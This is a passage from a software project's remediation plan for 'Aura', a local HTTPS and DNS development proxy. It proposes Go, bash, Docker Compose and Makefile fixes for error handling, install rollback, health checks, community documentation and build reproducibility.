    ErrCodePermission
    ErrCodeDocker
    ErrCodeCertificate
    ErrCodeValidation
)

// AuraError represents a structured error
type AuraError struct {
    Code    int
    Message string
    Err     error
    Context map[string]interface{}
}

func (e *AuraError) Error() string {
    if e.Err != nil {
        return fmt.Sprintf("%s: %v", e.Message, e.Err)
    }
    return e.Message
}

func (e *AuraError) Unwrap() error {
    return e.Err
}

// New creates a new AuraError
func New(code int, message string) *AuraError {
    return &AuraError{
        Code:    code,
        Message: message,
        Context: make(map[string]interface{}),
    }
}

// Wrap wraps an existing error
func Wrap(err error, code int, message string) *AuraError {
    return &AuraError{
        Code:    code,
        Message: message,
        Err:     err,
        Context: make(map[string]interface{}),
    }
}

// With adds context to error
func (e *AuraError) With(key string, value interface{}) *AuraError {
    e.Context[key] = value
    return e
}

// Helper constructors
func ConfigError(message string, err error) *AuraError {
    return Wrap(err, ErrCodeConfiguration, message)
}

func PermissionError(message string, err error) *AuraError {
    return Wrap(err, ErrCodePermission, message)
}

func DockerError(message string, err error) *AuraError {
    return Wrap(err, ErrCodeDocker, message)
}

func CertificateError(message string, err error) *AuraError {
    return Wrap(err, ErrCodeCertificate, message)
}

func ValidationError(message string) *AuraError {
    return New(ErrCodeValidation, message)
}
```

2. Update commands to use structured errors:
```go
var certCmd = &cobra.Command{
    Use:   "cert [domain]",
    Short: "Generate certificate for a domain",
    Args:  cobra.ExactArgs(1),
    RunE: func(cmd *cobra.Command, args []string) error {
        domain := args[0]
        if !strings.HasSuffix(domain, auraTLD) {
            domain += auraTLD
        }

        // Validate domain
        if err := validateDomain(domain); err != nil {
            return errors.ValidationError(fmt.Sprintf("invalid domain %q", domain)).
                With("domain", domain)
        }

        logger.Info("Generating certificate", "domain", domain)

        certScript := filepath.Join(auraDir, "add-cert.sh")
        if err := runCommand("bash", certScript, domain); err != nil {
            return errors.CertificateError("failed to generate certificate", err).
                With("domain", domain).
                With("script", certScript)
        }

        logger.Info("Certificate generated successfully", "domain", domain)
        return nil
    },
}
```

**Acceptance Criteria:**
- [ ] Structured error types
- [ ] Consistent error wrapping
- [ ] Error codes for categorization
- [ ] Context attached to errors
- [ ] User-friendly error messages
- [ ] Documentation for error handling

---

### 🟡 MED-006: No Cleanup on Install Failure

**Status:** ❌ Not Started
**Priority:** MEDIUM
**Impact:** System left in inconsistent state
**Location:** `cmd/aura/main.go:43-72` (installCmd)

**Problem:**
If installation fails partway through, partial state remains with no cleanup.

**Solution:**
Implement transaction-like install with rollback on failure.

**Implementation:**

```go
// installState tracks what was created during installation
type installState struct {
    createdDir          bool
    copiedConfigs       bool
    configuredLoopback  bool
    configuredDNS       bool
    installedMkcert     bool
    generatedCert       bool
}

func (s *installState) rollback() {
    logger.Warn("Installation failed, performing rollback")

    if s.generatedCert {
        logger.Debug("Removing generated certificates")
        os.RemoveAll(filepath.Join(auraDir, "certs"))
    }

    if s.configuredDNS {
        logger.Debug("Removing DNS configuration")
        script := filepath.Join(auraDir, "uninstall-resolver.sh")
        if _, err := os.Stat(script); err == nil {
            _ = runCommand("bash", script)
        }
    }

    if s.configuredLoopback {
        logger.Debug("Removing loopback configuration")
        script := filepath.Join(auraDir, "uninstall-loopback.sh")
        if _, err := os.Stat(script); err == nil {
            _ = runCommand("bash", script)
        }
    }

    if s.createdDir {
        logger.Debug("Removing .aura directory", "path", auraDir)
        os.RemoveAll(auraDir)
    }

    logger.Info("Rollback complete")
}

var installCmd = &cobra.Command{
    Use:   "install",
    Short: "Install Aura proxy system",
    Long:  `Sets up the Aura proxy system including loopback address, mkcert, and Docker configuration.`,
    RunE: func(cmd *cobra.Command, args []string) error {
        logger.Info("Installing Aura proxy system")

        state := &installState{}

        // Cleanup on failure
        defer func() {
            if r := recover(); r != nil {
                state.rollback()
                panic(r)
            }
        }()

        // Create .aura directory
        logger.Debug("Creating aura directory", "path", auraDir)
        if err := os.MkdirAll(auraDir, 0755); err != nil {
            return errors.ConfigError("failed to create aura directory", err)
        }
        state.createdDir = true

        // Copy configuration files
        logger.Info("Copying configuration files")
        if err := copyConfigs(); err != nil {
            state.rollback()
            return errors.ConfigError("failed to copy configs", err)
        }
        state.copiedConfigs = true

        // Run setup script
        setupScript := filepath.Join(auraDir, "setup.sh")
        logger.Info("Running setup script", "script", setupScript)
        if err := runCommandWithTimeout(5*time.Minute, "bash", setupScript); err != nil {
            state.rollback()
            return errors.ConfigError("setup failed", err)
        }

        // Mark various states as we go...
        state.configuredLoopback = true
        state.configuredDNS = true
        state.installedMkcert = true
        state.generatedCert = true

        logger.Info("Aura proxy installed successfully!")
        fmt.Println("\nNext steps:")
        fmt.Println("  1. Start the proxy: aura start")
        fmt.Println("  2. Test it: open https://whoami.aura")
        return nil
    },
}
```

**Acceptance Criteria:**
- [ ] Track installation state
- [ ] Rollback on failure
- [ ] Clean error messages
- [ ] Test partial installation failure
- [ ] System returns to clean state

---

### 🟡 MED-007: Race Condition in Certificate Generation

**Status:** ❌ Not Started
**Priority:** MEDIUM
**Impact:** TOCTOU vulnerability (low risk)
**Location:** `add-cert.sh:42-53`

**Problem:**
Time-of-check-time-of-use issue in certificate regeneration prompt.

**Solution:**
Use atomic operations or locks.

**Implementation:**

```bash
# Use mkdir -p atomically instead of separate check
mkdir -p "$CERT_DIR" || {
    echo "Error: Failed to create certificate directory"
    exit 1
}

# Use a lock file for additional protection
LOCK_FILE="$CERT_DIR/.lock"

# Acquire lock
exec 200>"$LOCK_FILE"
flock -n 200 || {
    echo "Error: Certificate generation already in progress for $DOMAIN"
    exit 1
}

# Check if certificate exists after acquiring lock
if [ -f "$CERT_DIR/cert.pem" ] && [ -f "$CERT_DIR/key.pem" ]; then
    echo "Certificate for $DOMAIN already exists in $CERT_DIR"
    read -p "Do you want to regenerate it? (y/N): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        echo "Keeping existing certificate"
        exit 0
    else
        echo "Regenerating certificate for $DOMAIN..."
        rm -f "$CERT_DIR/cert.pem" "$CERT_DIR/key.pem"
    fi
fi

# Generate certificate...

# Release lock (automatic on script exit)
```

**Acceptance Criteria:**
- [ ] Atomic directory creation
- [ ] Lock file prevents concurrent generation
- [ ] Clean error messages
- [ ] Lock released on exit

---

### 🟡 MED-008: Reference to Wrong Script Name

**Status:** ❌ Not Started
**Priority:** MEDIUM
**Impact:** User confusion
**Location:** `setup-mkcert.sh:67`

**Problem:**
Script refers to `add-site.sh` which doesn't exist. Should be `add-cert.sh`.

**Solution:**
Fix the reference.

**Implementation:**

```bash
echo ""
echo "✓ mkcert setup complete!"
echo "  Certificates location: $CERTS_DIR"
echo "  - ca.pem (CA certificate)"
echo "  - domains/ (individual domain certificates)"
echo ""
echo "To generate a certificate for a new .aura domain, use:"
echo "  ./add-cert.sh <domain-name>"
echo ""
echo "Example:"
echo "  ./add-cert.sh app.aura"
echo "  ./add-cert.sh api.aura"
```

**Acceptance Criteria:**
- [ ] Correct script name referenced
- [ ] Examples match actual commands
- [ ] Verify all documentation uses correct names

---

### 🟡 MED-009: No Health Checks on Docker Services

**Status:** ❌ Not Started
**Priority:** MEDIUM
**Impact:** Status checking, reliability
**Location:** `docker-compose.yml`

**Problem:**
Services have no health checks. Status only checks container existence, not functionality.

**Solution:**
Add Docker healthchecks for all services.

**Implementation:**

```yaml
services:
  caddy:
    image: lucaslorentz/caddy-docker-proxy:2.8.4-alpine
    container_name: aura-caddy
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "wget", "--no-verbose", "--tries=1", "--spider", "http://localhost:2019/config/"]
      interval: 10s
      timeout: 5s
      retries: 3
      start_period: 10s
    # ... rest of config

  coredns:
    image: coredns/coredns:1.11.1
    container_name: aura-coredns
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "sh", "-c", "dig @localhost whoami.aura +short | grep -q 127.0.0.2"]
      interval: 10s
      timeout: 5s
      retries: 3
      start_period: 5s
    # ... rest of config

  whoami:
    image: traefik/whoami:v1.10.1
    container_name: aura-whoami
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "wget", "--no-verbose", "--tries=1", "--spider", "http://localhost"]
      interval: 10s
      timeout: 5s
      retries: 3
      start_period: 5s
    # ... rest of config
```

Update status command to check health:
```go
var statusCmd = &cobra.Command{
    Use:   "status",
    Short: "Show Aura proxy status",
    RunE: func(cmd *cobra.Command, args []string) error {
        logger.Info("Checking Aura proxy status")

        // Check if containers are running with health status
        output, err := exec.Command("docker", "ps",
            "--filter", "name=aura-",
            "--format", "table {{.Names}}\t{{.Status}}\t{{.State}}")Output()

        if err != nil || len(output) == 0 {
            fmt.Println("❌ Aura proxy is not running")
            fmt.Println("   Start with: aura start")
            return nil
        }

        fmt.Println("✅ Aura proxy containers:")
        fmt.Println(string(output))

        // Check for unhealthy containers
        unhealthy, _ := exec.Command("docker", "ps",
            "--filter", "name=aura-",
            "--filter", "health=unhealthy",
            "--format", "{{.Names}}").Output()

        if len(unhealthy) > 0 {
            fmt.Println("\n⚠️  Warning: Some containers are unhealthy:")
            fmt.Println(string(unhealthy))
            fmt.Println("   Check logs: aura logs -f")
        }

        return nil
    },
}
```

**Acceptance Criteria:**
- [ ] Health checks for all services
- [ ] Status command shows health
- [ ] Unhealthy containers flagged
- [ ] Appropriate intervals and timeouts
- [ ] Documentation updated

---

### 🟡 MED-010: Large Uncommitted Assets

**Status:** ❌ Not Started
**Priority:** MEDIUM
**Impact:** Repository size, clone time
**Location:** `.github/assets/`

**Problem:**
Images are 4MB total, could be <500KB with optimization.

**Solution:**
Optimize images for web.

**Implementation:**

```bash
# Install optimization tools
brew install imagemagick

# Optimize header image
convert .github/assets/aura-header.png \
    -strip \
    -quality 85 \
    -resize 1600x \
    .github/assets/aura-header-optimized.png

# Optimize orb image
convert .github/assets/aura-orb.png \
    -strip \
    -quality 85 \
    -resize 800x \
    .github/assets/aura-orb-optimized.png

# Replace originals
mv .github/assets/aura-header-optimized.png .github/assets/aura-header.png
mv .github/assets/aura-orb-optimized.png .github/assets/aura-orb.png
```

**Acceptance Criteria:**
- [ ] Header image <600KB
- [ ] Orb image <300KB
- [ ] No visible quality loss
- [ ] Update in git history

---

## Low Priority Issues

### 🟢 LOW-001: Missing Open Source Documentation

**Status:** ❌ Not Started
**Priority:** LOW
**Impact:** Community contributions
**Location:** Project root

**Problem:**
Missing standard open source project files.

**Solution:**
Add standard community files.

**Implementation:**

1. Create `SECURITY.md`:
```markdown
# Security Policy

## Supported Versions

| Version | Supported          |
| ------- | ------------------ |
| 1.x.x   | :white_check_mark: |
| < 1.0   | :x:                |

## Reporting a Vulnerability

**Please do not report security vulnerabilities through public GitHub issues.**

Instead, please report them via email to: [your-email@example.com]

You should receive a response within 48 hours. If you don't, please follow up via email.

Please include:
- Type of vulnerability
- Full paths of affected files
- Location of affected code (tag/branch/commit/URL)
- Step-by-step instructions to reproduce
- Proof-of-concept or exploit code (if possible)
- Impact of the vulnerability

## Security Best Practices

When using Aura:
1. Never run `aura install` from untrusted directories
2. Keep Docker and Docker Compose up to date
3. Review certificates in `~/.aura/certs/domains/`
4. Monitor DNS queries: `docker logs -f aura-coredns`
5. Regularly update Docker images: `aura stop && docker compose pull && aura start`

## Known Limitations

Aura is designed for local development only. Do not:
- Expose Aura proxy to the internet
- Use in production environments
- Share mkcert CA key with others
```

2. Create `CONTRIBUTING.md`:
```markdown
# Contributing to Aura

Thank you for your interest in contributing!

## Development Setup

1. **Fork and clone:**
   ```bash
   git clone https://github.com/YOUR_USERNAME/aura.git
   cd aura
   ```

2. **Install dependencies:**
   ```bash
   go mod download
   npm install
   ```

3. **Build and test:**
   ```bash
   make build
   make test
   go test -v -tags=integration ./...
   ```

## Making Changes

1. **Create a branch:**
   ```bash
   git checkout -b feature/my-feature
   ```

2. **Follow conventions:**
   - Use [Conventional Commits](https://www.conventionalcommits.org/)
   - Run `go fmt` and `golangci-lint run`
   - Add tests for new features
   - Update documentation

3. **Commit format:**
   ```
   <type>(<scope>): <subject>

   <body>

   <footer>
   ```

   Types: `feat`, `fix`, `docs`, `style`, `refactor`, `perf`, `test`, `build`, `ci`, `chore`

## Testing

- Unit tests: `make test`
- Integration tests: `make test-integration`
- Coverage: `make test-coverage`
- All CI checks: Pushed to GitHub

## Pull Request Process

1. Update README.md with any interface changes
2. Add entry to docs/EXAMPLES.md if adding features
3. Update docs/TROUBLESHOOTING.md for bug fixes
4. Ensure CI passes
5. Request review from maintainers

## Code Review Guidelines

- Be respectful and constructive
- Focus on code, not people
- Provide specific, actionable feedback
- Approve when ready, request changes if needed

## Questions?

Open an issue or discussion on GitHub.
```

3. Create `.github/CODE_OF_CONDUCT.md`:
```markdown
# Contributor Covenant Code of Conduct

## Our Pledge

We pledge to make participation in our project a harassment-free experience for everyone.

## Our Standards

Positive behavior:
- Using welcoming and inclusive language
- Being respectful of differing viewpoints
- Gracefully accepting constructive criticism
- Focusing on what is best for the community

Unacceptable behavior:
- Trolling, insulting/derogatory comments, personal attacks
- Public or private harassment
- Publishing others' private information without permission
- Other conduct which could reasonably be considered inappropriate

## Enforcement

Violations may be reported to [your-email@example.com]. All complaints will be reviewed and investigated.

## Attribution

This Code of Conduct is adapted from the [Contributor Covenant](https://www.contributor-covenant.org/), version 2.1.
```

**Acceptance Criteria:**
- [ ] SECURITY.md created with reporting process
- [ ] CONTRIBUTING.md with development guide
- [ ] CODE_OF_CONDUCT.md in place
- [ ] Email addresses updated
- [ ] Linked from README.md

---

### 🟢 LOW-002: No Dependabot Configuration

**Status:** ❌ Not Started
**Priority:** LOW
**Impact:** Dependency security
**Location:** `.github/dependabot.yml`

**Problem:**
No automated dependency updates.

**Solution:**
Already covered in HIGH-007. Ensure configuration is complete.

---

### 🟢 LOW-003: No Windows Support Check

**Status:** ❌ Not Started
**Priority:** LOW
**Impact:** User experience on Windows
**Location:** `cmd/aura/main.go`

**Problem:**
Code runs on Windows but fails during install without helpful message.

**Solution:**
Detect Windows early and show helpful message.

**Implementation:**

```go
import "runtime"

func init() {
    // Check platform
    if runtime.GOOS == "windows" {
        fmt.Fprintf(os.Stderr, `
⚠️  Aura does not currently support Windows.

Supported platforms:
  • macOS 10.14+
  • Linux (with systemd-resolved)

Alternatives for Windows:
  • Use WSL2 (Windows Subsystem for Linux)
  • Use a Linux VM

For WSL2 installation:
  1. Enable WSL2: wsl --install
  2. Install Ubuntu: wsl --install -d Ubuntu
  3. Run Aura inside WSL2

Learn more: https://github.com/ivannovak/aura#requirements
`)
        os.Exit(1)
    }

    // Initialize auraDir
    home, err := os.UserHomeDir()
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error: Unable to determine home directory: %v\n", err)
        os.Exit(1)
    }
    auraDir = filepath.Join(home, ".aura")
}
```

**Acceptance Criteria:**
- [ ] Detect Windows at startup
- [ ] Helpful error message
- [ ] Point to WSL2 documentation
- [ ] Exit gracefully

---

### 🟢 LOW-004: Makefile install No Error Checking

**Status:** ❌ Not Started
**Priority:** LOW
**Impact:** Silent failures
**Location:** `Makefile:12`

**Problem:**
Install target doesn't check if operations succeeded.

**Solution:**
Add error checking.

**Implementation:**

```makefile
install: build
	@echo "Installing Aura CLI to $(INSTALL_PATH)..."
	@if [ ! -d "$(INSTALL_PATH)" ]; then \
		echo "Error: $(INSTALL_PATH) does not exist"; \
		exit 1; \
	fi
	@if ! sudo cp $(BINARY_NAME) $(INSTALL_PATH)/; then \
		echo "Error: Failed to copy binary to $(INSTALL_PATH)"; \
		exit 1; \
	fi
	@if ! sudo chmod +x $(INSTALL_PATH)/$(BINARY_NAME); then \
		echo "Error: Failed to set executable permissions"; \
		exit 1; \
	fi
	@echo "✅ Aura CLI installed successfully!"
	@echo "Run 'aura version' to verify installation"
	@echo ""
	@echo "Next steps:"
	@echo "  1. Set up the proxy: aura install"
	@echo "  2. Start the proxy: aura start"
	@echo "  3. Test it: open https://whoami.aura"

.PHONY: verify-install
verify-install:
	@if ! which aura > /dev/null 2>&1; then \
		echo "❌ aura not found in PATH"; \
		exit 1; \
	fi
	@echo "✅ aura is installed"
	@aura version
```

**Acceptance Criteria:**
- [ ] Check if INSTALL_PATH exists
- [ ] Verify copy succeeded
- [ ] Verify chmod succeeded
- [ ] Add verify-install target

---

### 🟢 LOW-005: No Rate Limiting on DNS

**Status:** ❌ Not Started
**Priority:** LOW
**Impact:** Resource abuse (theoretical)
**Location:** `coredns/Corefile`

**Problem:**
No rate limiting on DNS queries.

**Solution:**
Add rate limiting plugin (low priority since bound to localhost).

**Implementation:**

```
aura:53 {
    # Rate limiting (if CoreDNS supports)
    # ratelimit 100  # 100 queries per second per client

    log
    template IN A aura {
        answer "{{ .Name }} 0 IN A 127.0.0.2"
        rcode NOERROR
    }
    template IN AAAA aura {
        rcode NOERROR
    }
    errors
}
```

**Note:** Check CoreDNS version for rate limiting plugin availability.

**Acceptance Criteria:**
- [ ] Research rate limiting options
- [ ] Document if not feasible
- [ ] Low priority - review later

---

### 🟢 LOW-006: Inconsistent sudo Usage

**Status:** ❌ Not Started
**Priority:** LOW
**Impact:** User experience
**Location:** Multiple scripts

**Problem:**
Scripts require sudo but don't indicate upfront which operations need privileges.

**Solution:**
Check sudo early, provide clear messaging.

**Implementation:**

```bash
#!/bin/bash
set -e

# Function to check if running as root or sudo available
check_sudo() {
    if [ "$EUID" -eq 0 ]; then
        return 0
    fi

    if ! command -v sudo &> /dev/null; then
        echo "Error: This script requires sudo, but sudo is not installed"
        exit 1
    fi

    # Test sudo access
    if ! sudo -n true 2>/dev/null; then
        echo "This script requires sudo access for:"
        echo "  - Creating system services"
        echo "  - Configuring DNS resolver"
        echo "  - Setting up loopback address"
        echo ""
        echo "You may be prompted for your password."
        echo ""

        # Prompt for sudo
        sudo -v || {
            echo "Error: sudo authentication failed"
            exit 1
        }
    fi
}

# Call at start of scripts that need sudo
check_sudo

# Rest of script...
```

**Acceptance Criteria:**
- [ ] Sudo check function
- [ ] Clear messaging about why sudo needed
- [ ] Early failure if sudo unavailable
- [ ] Apply to all setup scripts

---

### 🟢 LOW-007: Setup Script User Confirmation Blocks Automation

**Status:** ❌ Not Started
**Priority:** LOW
**Impact:** CI/CD integration
**Location:** `setup.sh:19-25`

**Problem:**
Interactive prompt blocks automation.

**Solution:**
Add `-y` flag to skip confirmation.

**Implementation:**

```bash
#!/bin/bash
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
AUTO_CONFIRM=false

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -y|--yes)
            AUTO_CONFIRM=true
            shift
            ;;
        *)
            echo "Unknown option: $1"
            echo "Usage: $0 [-y|--yes]"
            exit 1
            ;;
    esac
done

echo "========================================"
echo "     Aura Proxy Setup"
echo "========================================"
echo ""
echo "This script will set up the complete Aura proxy system:"
echo "  1. Configure custom loopback address (127.0.0.2)"
echo "  2. Configure DNS resolver for .aura domains"
echo "  3. Install and configure mkcert"
echo "  4. Create necessary directories"
echo "  5. Make scripts executable"
echo ""

if [ "$AUTO_CONFIRM" = false ]; then
    read -p "Continue with setup? (y/N): " -n 1 -r
    echo ""

    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        echo "Setup cancelled"
        exit 0
    fi
fi

# Continue with setup...
```

**Acceptance Criteria:**
- [ ] `-y` flag skips prompts
- [ ] Works in CI/CD
- [ ] Still prompts by default
- [ ] Document flag in --help

---

### 🟢 LOW-008: Hardcoded mkcert Version

**Status:** ❌ Not Started
**Priority:** LOW
**Impact:** Outdated software
**Location:** `setup-mkcert.sh:28`

**Problem:**
Version hardcoded with no explanation.

**Solution:**
Document reasoning or add update check.

**Implementation:**

```bash
# mkcert version
# Update this when new versions are released
# Check: https://github.com/FiloSottile/mkcert/releases
# Last updated: 2025-01-20
# Reason: v1.4.4 is latest stable as of this date
MKCERT_VERSION="v1.4.4"

# Optional: Check for newer version
check_latest_version() {
    if command -v curl &> /dev/null && command -v jq &> /dev/null; then
        LATEST=$(curl -s https://api.github.com/repos/FiloSottile/mkcert/releases/latest | jq -r .tag_name)
        if [ "$LATEST" != "$MKCERT_VERSION" ]; then
            echo "Note: mkcert $LATEST is available (installing $MKCERT_VERSION)"
            echo "Update MKCERT_VERSION in setup-mkcert.sh to use latest"
        fi
    fi
}
```

**Acceptance Criteria:**
- [ ] Document version choice
- [ ] Optional update check
- [ ] Clear update process

---

### 🟢 LOW-009: No Build Reproducibility

**Status:** ❌ Not Started
**Priority:** LOW
**Impact:** Build consistency
**Location:** Makefile build flags

**Problem:**
Builds not reproducible.

**Solution:**
Add reproducibility flags.

**Implementation:**

```makefile
# Reproducible build flags
LDFLAGS=-ldflags "\
	-X 'github.com/ivannovak/aura/pkg/version.Version=$(VERSION)' \
	-X 'github.com/ivannovak/aura/pkg/version.GitCommit=$(GIT_COMMIT)' \
	-X 'github.com/ivannovak/aura/pkg/version.BuildDate=$(BUILD_DATE)' \
	-X 'github.com/ivannovak/aura/pkg/version.GoVersion=$(GO_VERSION)' \
	-X 'github.com/ivannovak/aura/pkg/version.Platform=$(PLATFORM)' \
	-s -w"

# Reproducible build flags
BUILDFLAGS=-trimpath -buildmode=pie

build:
	@echo "Building Aura CLI..."
	@CGO_ENABLED=0 go build $(BUILDFLAGS) $(LDFLAGS) -o $(BINARY_NAME) ./cmd/aura

build-reproducible:
	@echo "Building reproducible binary..."
	@CGO_ENABLED=0 SOURCE_DATE_EPOCH=$(shell git log -1 --format=%ct) \
		go build $(BUILDFLAGS) $(LDFLAGS) -o $(BINARY_NAME) ./cmd/aura
```

**Acceptance Criteria:**
- [ ] Trimpath removes local paths
- [ ] Source date epoch from git
- [ ] CGO disabled for static binary
- [ ] Document reproducibility

---

### 🟢 LOW-010: Function Length - copyConfigs

**Status:** ❌ Not Started
**Priority:** LOW
**Impact:** Code maintainability
**Location:** `cmd/aura/main.go:242-288`

**Problem:**
`copyConfigs()` is 47 lines, could be more modular.

**Solution:**
Break into smaller functions.

**Implementation:**

```go
func copyConfigs() error {
    if err := copyConfigFiles(); err != nil {
        return err
    }

    if err := createDirectories(); err != nil {
        return err
    }

    if err := copyCorefileConfig(); err != nil {
        return err
    }

    return nil
}

func copyConfigFiles() error {
    for _, file := range configFiles {
        if err := copyEmbeddedFile(file, filepath.Join(auraDir, file)); err != nil {
            return err
        }
    }
    return nil
}

func copyEmbeddedFile(src, dst string) error {
    data, err := embeddedFS.ReadFile(src)
    if err != nil {
        return fmt.Errorf("failed to read embedded %s: %w", src, err)
    }

    if err := os.WriteFile(dst, data, filePermScript); err != nil {
        return fmt.Errorf("failed to write %s: %w", dst, err)
    }

    logger.Debug("Copied file", "src", src, "dst", dst)
    return nil
}

func createDirectories() error {
    dirs := []struct {
        path string
        perm os.FileMode
    }{
        {filepath.Join(auraDir, dirCertsDomains), dirPermCerts},
        {filepath.Join(auraDir, dirCoredns), dirPermDefault},
    }

    for _, dir := range dirs {
        if err := os.MkdirAll(dir.path, dir.perm); err != nil {
            return fmt.Errorf("failed to create directory %s: %w", dir.path, err)
        }
        logger.Debug("Created directory", "path", dir.path, "perm", dir.perm)
    }

    return nil
}

func copyCorefileConfig() error {
    src := "coredns/Corefile"
    dst := filepath.Join(auraDir, "coredns", "Corefile")
    return copyEmbeddedFile(src, dst)
}
```

**Acceptance Criteria:**
- [ ] Each function <20 lines
- [ ] Clear single responsibility
- [ ] Better error messages
- [ ] Easier to test

---

## Architectural Improvements

### ARCH-001: Shell Script Dependency

**Status:** ❌ Not Started
**Priority:** LOW
**Impact:** Cross-platform support, security

**Problem:**
Heavy reliance on bash scripts makes Windows support impossible and increases attack surface.

**Recommendation:**
Consider pure Go implementation for system configuration in future major version (v2.0).

**Implementation Sketch:**

```go
package config

type SystemConfigurer interface {
    ConfigureDNS(domain string, nameserver string) error
    ConfigureLoopback(ip string) error
    InstallCertAuthority() error
    Cleanup() error
}

type MacOSConfigurer struct{}
type LinuxConfigurer struct{}
type WindowsConfigurer struct{} // Future

func NewConfigurer() (SystemConfigurer, error) {
    switch runtime.GOOS {
    case "darwin":
        return &MacOSConfigurer{}, nil
    case "linux":
        return &LinuxConfigurer{}, nil
    case "windows":
        return nil, errors.New("Windows not yet supported")
    default:
        return nil, fmt.Errorf("unsupported OS: %s", runtime.GOOS)
    }
}

// MacOS implementation
func (m *MacOSConfigurer) ConfigureDNS(domain string, nameserver string) error {
    resolverFile := filepath.Join("/etc/resolver", domain)

    content := fmt.Sprintf("nameserver %s\n", nameserver)

    // Use syscall to write with proper permissions
    // ... implementation ...

    return nil
}
```

**Decision:** Defer to v2.0 - current bash approach works for target platforms.

---

### ARCH-002: Global Variables

**Status:** ❌ Not Started
**Priority:** LOW
**Impact:** Testability, modularity

**Problem:**
Global variables make testing harder.

**Recommendation:**
Refactor to use configuration struct.

**Implementation Sketch:**

```go
type Config struct {
    AuraDir    string
    TLD        string
    LoopbackIP string
    LogLevel   string
    LogFormat  string
}

func DefaultConfig() *Config {
    home, _ := os.UserHomeDir()
    return &Config{
        AuraDir:    filepath.Join(home, ".aura"),
        TLD:        ".aura",
        LoopbackIP: "127.0.0.2",
        LogLevel:   "info",
        LogFormat:  "text",
    }
}

// Update commands to use config
type AuraCommand struct {
    config *Config
    logger *logger.Logger
}

func NewAuraCommand(cfg *Config) *AuraCommand {
    return &AuraCommand{
        config: cfg,
    }
}
```

**Decision:** Acceptable for current scope, revisit in v2.0.

---

### ARCH-003: Dependency Injection for Testing

**Status:** ❌ Not Started
**Priority:** LOW
**Impact:** Test coverage

**Problem:**
Hard to mock external dependencies (Docker, mkcert, etc).

**Recommendation:**
Use interfaces for external dependencies.

**Implementation Sketch:**

```go
type DockerClient interface {
    ComposeUp(dir string) error
    ComposeDown(dir string) error
    ContainerStatus(name string) (string, error)
}

type CertGenerator interface {
    Generate(domain string, output string) error
    InstallCA() error
}

type AuraService struct {
    docker DockerClient
    certs  CertGenerator
    config *Config
}

func NewAuraService(docker DockerClient, certs CertGenerator, cfg *Config) *AuraService {
    return &AuraService{
        docker: docker,
        certs:  certs,
        config: cfg,
    }
}

// Mock for testing
type MockDockerClient struct {
    ComposeUpError error
}

func (m *MockDockerClient) ComposeUp(dir string) error {
    return m.ComposeUpError
}
```

**Decision:** Good practice for v2.0, current code acceptable for CLI tool.

---

## Progress Tracking

### Critical Issues: 6 total
- [ ] SEC-001: Path Traversal in Installation
- [ ] SEC-002: Input Validation
- [ ] SEC-003: Docker Socket Security
- [ ] SEC-004: Binary Download Verification
- [ ] SEC-005: Environment Variable Security
- [ ] SEC-006: DNS Fallback Documentation

### High Priority: 9 total
- [ ] HIGH-001: Module Path Mismatch
- [ ] HIGH-002: Test Bug
- [ ] HIGH-003: Dependencies Marked Indirect
- [ ] HIGH-004: Incomplete Uninstall
- [ ] HIGH-005: CI Scans Don't Block
- [ ] HIGH-006: No Version Info in Binary
- [ ] HIGH-007: Docker Images Not Pinned
- [ ] HIGH-008: Docker Compose Version Deprecated
- [ ] HIGH-009: Glob Pattern Assumptions

### Medium Priority: 10 total
- [ ] MED-001: Minimal Test Coverage
- [ ] MED-002: No Structured Logging
- [ ] MED-003: Hardcoded Magic Strings
- [ ] MED-004: No Context Support
- [ ] MED-005: Inconsistent Error Handling
- [ ] MED-006: No Install Rollback
- [ ] MED-007: Race Condition in Cert Gen
- [ ] MED-008: Wrong Script Name Reference
- [ ] MED-009: No Health Checks
- [ ] MED-010: Large Assets

### Low Priority: 10 total
- [ ] LOW-001: Missing OSS Documentation
- [ ] LOW-002: No Dependabot
- [ ] LOW-003: No Windows Check
- [ ] LOW-004: Makefile Error Checking
- [ ] LOW-005: No DNS Rate Limiting
- [ ] LOW-006: Inconsistent sudo
- [ ] LOW-007: Setup Blocks Automation
- [ ] LOW-008: Hardcoded mkcert Version
- [ ] LOW-009: Build Reproducibility
- [ ] LOW-010: Function Length

### Architectural: 3 total
- [ ] ARCH-001: Shell Script Dependency (defer to v2.0)
- [ ] ARCH-002: Global Variables (defer to v2.0)
- [ ] ARCH-003: Dependency Injection (defer to v2.0)

---

## Milestone Roadmap

### Milestone 1: Security Hardening (1-2 weeks)
**Goal:** Eliminate all critical security vulnerabilities

- [ ] SEC-001: Embed configs in binary
- [ ] SEC-002: Domain validation
- [ ] SEC-003: Docker socket proxy
- [ ] SEC-004: Binary checksum verification
- [ ] SEC-005: Use os.UserHomeDir()
- [ ] SEC-006: Document DNS security

**Definition of Done:** All CRITICAL issues resolved, security scan passes

---

### Milestone 2: Quality & Consistency (1 week)
**Goal:** Fix high-priority bugs and inconsistencies

- [ ] HIGH-001: Fix module path
- [ ] HIGH-002: Fix test bug
- [ ] HIGH-003: Clean up go.mod
- [ ] HIGH-004: Complete uninstall
- [ ] HIGH-005: Make CI blocking
- [ ] HIGH-006: Add build info
- [ ] HIGH-007: Pin Docker images
- [ ] HIGH-008: Remove compose version
- [ ] HIGH-009: Fix cert generation

**Definition of Done:** All HIGH issues resolved, CI passes consistently

---

### Milestone 3: Testing & Observability (1 week)
**Goal:** Increase test coverage and improve debugging

- [ ] MED-001: Expand test suite (>70% coverage)
- [ ] MED-002: Add structured logging
- [ ] MED-003: Define constants
- [ ] MED-004: Context support
- [ ] MED-005: Consistent error handling
- [ ] MED-006: Install rollback

**Definition of Done:** Test coverage >70%, structured logging in place

---

### Milestone 4: Polish & Documentation (3-5 days)
**Goal:** Professional open source project

- [ ] MED-007-010: Remaining medium issues
- [ ] LOW-001: OSS documentation
- [ ] LOW-002-010: Low priority fixes
- [ ] Final documentation review
- [ ] Update all examples

**Definition of Done:** All documentation complete, professional presentation

---

## Success Metrics

### Code Quality
- [ ] Test coverage: >70%
- [ ] Zero gosec warnings
- [ ] Zero shellcheck errors
- [ ] golangci-lint passes
- [ ] All CI checks green

### Security
- [ ] No known vulnerabilities
